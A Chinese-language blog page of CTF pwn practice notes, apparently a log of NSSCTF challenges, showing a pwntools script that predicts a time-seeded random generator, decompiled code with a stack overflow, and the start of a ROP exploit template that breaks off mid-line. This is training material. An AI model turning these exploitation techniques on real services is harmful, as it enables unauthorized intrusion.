<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="NSSCTF刷题记录11.9[GDOUCTF 2023]真男人下120层123456789101112131415161718192021from pwn import *from ctypes import *import timecontext.log_level &#x3D; &#x27;debug&#x27;io &#x3D; remote(&quot;node4.anna.nssctf.cn&quot;,2">
<meta property="og:type" content="article">
<meta property="og:title" content="NSSCTF刷题记录">
<meta property="og:url" content="http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="N1ght">
<meta property="og:description" content="NSSCTF刷题记录11.9[GDOUCTF 2023]真男人下120层123456789101112131415161718192021from pwn import *from ctypes import *import timecontext.log_level &#x3D; &#x27;debug&#x27;io &#x3D; remote(&quot;node4.anna.nssctf.cn&quot;,2">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image-20241112183135-5cz4moe.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image-20241112221758-1ku4us9.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image-20241112222703-qbrvjdh.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image-20241112223602-wd6l2zr.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image-20241113093933-x7vj42h.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image-20241113100353-feh0kc6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image-20241113100954-5ai79x6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image-20241113204341-l0h64je.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image-20241113204955-uer0tqa.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image/image-20241114203744-skqyln2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image/image-20241114205002-1ginaao.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/image/image-20241115221258-hy4yvas.png">
<meta property="article:published_time" content="2024-11-16T10:00:00.000Z">
<meta property="article:modified_time" content="2024-11-16T11:10:58.828Z">
<meta property="article:author" content="N1ght">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/yezere/images/master/image-20241112183135-5cz4moe.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>NSSCTF刷题记录</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/12/07/qwb-final-dataease%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/11/09/SHCTF-ezjava/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&text=NSSCTF刷题记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&title=NSSCTF刷题记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&is_video=false&description=NSSCTF刷题记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=NSSCTF刷题记录&body=Check out this article: http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&title=NSSCTF刷题记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&title=NSSCTF刷题记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&title=NSSCTF刷题记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&title=NSSCTF刷题记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&name=NSSCTF刷题记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&t=NSSCTF刷题记录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">NSSCTF刷题记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#11-9"><span class="toc-number">1.1.</span> <span class="toc-text">11.9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GDOUCTF-2023-%E7%9C%9F%E7%94%B7%E4%BA%BA%E4%B8%8B120%E5%B1%82"><span class="toc-number">1.1.1.</span> <span class="toc-text">[GDOUCTF 2023]真男人下120层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2022-ret2text"><span class="toc-number">1.1.2.</span> <span class="toc-text">[MoeCTF 2022]ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NUSTCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ezPwn"><span class="toc-number">1.1.3.</span> <span class="toc-text">[NUSTCTF 2022 新生赛]ezPwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2023-%E5%88%9D%E8%B5%9B-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF"><span class="toc-number">1.1.4.</span> <span class="toc-text">[CISCN 2023 初赛]烧烤摊儿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDCTF-2023-KEEP-ON"><span class="toc-number">1.1.5.</span> <span class="toc-text">[HDCTF 2023]KEEP ON</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Integer-Overflow"><span class="toc-number">1.1.6.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]Integer Overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-Week1-ezcmp"><span class="toc-number">1.1.7.</span> <span class="toc-text">[HNCTF 2022 Week1]ezcmp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-fmt"><span class="toc-number">1.1.8.</span> <span class="toc-text">[HUBUCTF 2022 新生赛]fmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-Week1-ezr0p64"><span class="toc-number">1.1.9.</span> <span class="toc-text">[HNCTF 2022 Week1]ezr0p64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-shellcode%EF%BC%9F"><span class="toc-number">1.1.10.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]shellcode？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-WEEK2-ez-backdoor"><span class="toc-number">1.1.11.</span> <span class="toc-text">[HNCTF 2022 WEEK2]ez_backdoor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-singout"><span class="toc-number">1.1.12.</span> <span class="toc-text">[HUBUCTF 2022 新生赛]singout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-%E7%8B%A0%E7%8B%A0%E7%9A%84%E6%BA%A2%E5%87%BA%E6%B6%85"><span class="toc-number">1.1.13.</span> <span class="toc-text">[LitCTF 2023]狠狠的溢出涅~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-Week1-safe-shellcode"><span class="toc-number">1.1.14.</span> <span class="toc-text">[HNCTF 2022 Week1]safe_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-%E5%8F%A3%E7%AE%97%E9%A2%98%E5%8D%A1"><span class="toc-number">1.1.15.</span> <span class="toc-text">[LitCTF 2023]口算题卡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDCTF-2023-pwnner"><span class="toc-number">1.1.16.</span> <span class="toc-text">[HDCTF 2023]pwnner</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-10"><span class="toc-number">1.2.</span> <span class="toc-text">11.10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2022-shell"><span class="toc-number">1.2.1.</span> <span class="toc-text">[MoeCTF 2022]shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HGAME-2023-week1-easy-overflow"><span class="toc-number">1.2.2.</span> <span class="toc-text">[HGAME 2023 week1]easy_overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-babystack"><span class="toc-number">1.2.3.</span> <span class="toc-text">[UUCTF 2022 新生赛]babystack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2021-ret2text-ez"><span class="toc-number">1.2.4.</span> <span class="toc-text">[MoeCTF 2021]ret2text_ez</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2022-babyfmt"><span class="toc-number">1.2.5.</span> <span class="toc-text">[MoeCTF 2022]babyfmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Darling"><span class="toc-number">1.2.6.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]Darling</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-11"><span class="toc-number">1.3.</span> <span class="toc-text">11.11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SDCTF-2022-Horoscope"><span class="toc-number">1.3.1.</span> <span class="toc-text">[SDCTF 2022]Horoscope</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NISACTF-2022-shop-pwn"><span class="toc-number">1.3.2.</span> <span class="toc-text">[NISACTF 2022]shop_pwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%AD-PWN1"><span class="toc-number">1.3.3.</span> <span class="toc-text">[CISCN 2019华中]PWN1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2020-YDSneedGirlfriend"><span class="toc-number">1.3.4.</span> <span class="toc-text">[BJDCTF 2020]YDSneedGirlfriend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-login-normal"><span class="toc-number">1.3.5.</span> <span class="toc-text">[CISCN 2022 初赛]login_normal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2020-babyrop2"><span class="toc-number">1.3.6.</span> <span class="toc-text">[BJDCTF 2020]babyrop2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2018-%E6%8B%9B%E6%96%B0%E8%B5%9B-basic-pwn"><span class="toc-number">1.3.7.</span> <span class="toc-text">[SUCTF 2018 招新赛]basic pwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDCTF-2023-Minions"><span class="toc-number">1.3.8.</span> <span class="toc-text">[HDCTF 2023]Minions</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-12"><span class="toc-number">1.4.</span> <span class="toc-text">11.12</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-WEEK4-ezheap"><span class="toc-number">1.4.1.</span> <span class="toc-text">[HNCTF 2022 WEEK4]ezheap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GDOUCTF-2023-Random"><span class="toc-number">1.4.2.</span> <span class="toc-text">[GDOUCTF 2023]Random</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-13"><span class="toc-number">1.5.</span> <span class="toc-text">11.13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-easystack"><span class="toc-number">1.5.1.</span> <span class="toc-text">[UUCTF 2022 新生赛]easystack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDCTF-2023-Makewish"><span class="toc-number">1.5.2.</span> <span class="toc-text">[HDCTF 2023]Makewish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2023-%E5%88%9D%E8%B5%9B-funcanary"><span class="toc-number">1.5.3.</span> <span class="toc-text">[CISCN 2023 初赛]funcanary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E7%AD%BE%E5%88%B0"><span class="toc-number">1.5.4.</span> <span class="toc-text">[SWPUCTF 2023 秋季新生赛]签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019%E8%A5%BF%E5%8D%97-PWN1"><span class="toc-number">1.5.5.</span> <span class="toc-text">[CISCN 2019西南]PWN1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HGAME-2023-week1-simple-shellcode"><span class="toc-number">1.5.6.</span> <span class="toc-text">[HGAME 2023 week1]simple_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-WEEK2-ret2libc"><span class="toc-number">1.5.7.</span> <span class="toc-text">[HNCTF 2022 WEEK2]ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B-2022-jmp-rsp"><span class="toc-number">1.5.8.</span> <span class="toc-text">[广东省大学生攻防大赛 2022]jmp_rsp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NSSRound-4-SWPU-%E7%9C%9F%E7%AD%BE%E5%88%B0%E9%A2%98%E6%9D%A5%E8%AF%95%E8%AF%95%E5%90%A7"><span class="toc-number">1.5.9.</span> <span class="toc-text">[NSSRound#4 SWPU]真签到题来试试吧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8D%97-PWN4"><span class="toc-number">1.5.10.</span> <span class="toc-text">[CISCN 2019华南]PWN4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-14"><span class="toc-number">1.6.</span> <span class="toc-text">11.14</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FSCTF-2023-rdi"><span class="toc-number">1.6.1.</span> <span class="toc-text">[FSCTF 2023]rdi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-FindanotherWay"><span class="toc-number">1.6.2.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]FindanotherWay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#watevrCTF-2019-Voting-Machine-2"><span class="toc-number">1.6.3.</span> <span class="toc-text">[watevrCTF 2019]Voting Machine 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HGAME-2023-week1-choose-the-seat"><span class="toc-number">1.6.4.</span> <span class="toc-text">[HGAME 2023 week1]choose_the_seat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-15"><span class="toc-number">1.7.</span> <span class="toc-text">11.15</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-Shellcode"><span class="toc-number">1.7.1.</span> <span class="toc-text">[SWPUCTF 2023 秋季新生赛]Shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-16"><span class="toc-number">1.8.</span> <span class="toc-text">11.16</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NSSRound-9-Basic-MyExec"><span class="toc-number">1.8.1.</span> <span class="toc-text">[NSSRound#9 Basic]MyExec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2022-ret2libc"><span class="toc-number">1.8.2.</span> <span class="toc-text">[MoeCTF 2022]ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2021-ezROP"><span class="toc-number">1.8.3.</span> <span class="toc-text">[MoeCTF 2021]ezROP</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        NSSCTF刷题记录
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">N1ght</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-11-16T10:00:00.000Z" class="dt-published" itemprop="datePublished">2024-11-16</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="NSSCTF刷题记录"><a href="#NSSCTF刷题记录" class="headerlink" title="NSSCTF刷题记录"></a>NSSCTF刷题记录</h1><h2 id="11-9"><a href="#11-9" class="headerlink" title="11.9"></a>11.9</h2><h3 id="GDOUCTF-2023-真男人下120层"><a href="#GDOUCTF-2023-真男人下120层" class="headerlink" title="[GDOUCTF 2023]真男人下120层"></a>[GDOUCTF 2023]真男人下120层</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28832</span>)</span><br><span class="line"></span><br><span class="line">clibc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">v4 = clibc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">v5 = clibc.srand(<span class="built_in">int</span>(v4 % <span class="number">3</span> - <span class="number">1522127470</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">121</span>):</span><br><span class="line">    choice = clibc.random()  % <span class="number">4</span> + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="MoeCTF-2022-ret2text"><a href="#MoeCTF-2022-ret2text" class="headerlink" title="[MoeCTF 2022]ret2text"></a>[MoeCTF 2022]ret2text</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  _BYTE buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ve prepared a gift for you, if you don&#x27;t want to keep learning CET-4 words, find it out!&quot;</span>);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  learn[v4 % <span class="number">100</span>]();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Make a wish: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意一下对齐即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">24806</span></span><br><span class="line">	p = remote(ip, 